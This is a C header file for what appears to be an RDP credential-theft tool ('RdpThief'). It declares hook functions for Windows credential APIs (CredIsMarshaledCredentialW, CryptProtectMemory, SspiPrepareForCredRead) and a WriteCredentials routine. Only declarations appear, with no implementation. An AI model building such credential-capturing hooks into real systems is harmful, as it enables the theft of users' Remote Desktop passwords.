#ifndef RDPTHIEF_HOOKS_H
#define RDPTHIEF_HOOKS_H

#include <windows.h>
#include <macros.h>
#include <struct.h>

VOID _CredIsMarshaledCredentialW(PCONTEXT pThreadCtx);
VOID _CryptProtectMemory(PCONTEXT pThreadCtx);
VOID _SspiPrepareForCredRead(PCONTEXT pThreadCtx);
BOOL WriteCredentials();

#endif //RDPTHIEF_HOOKS_H
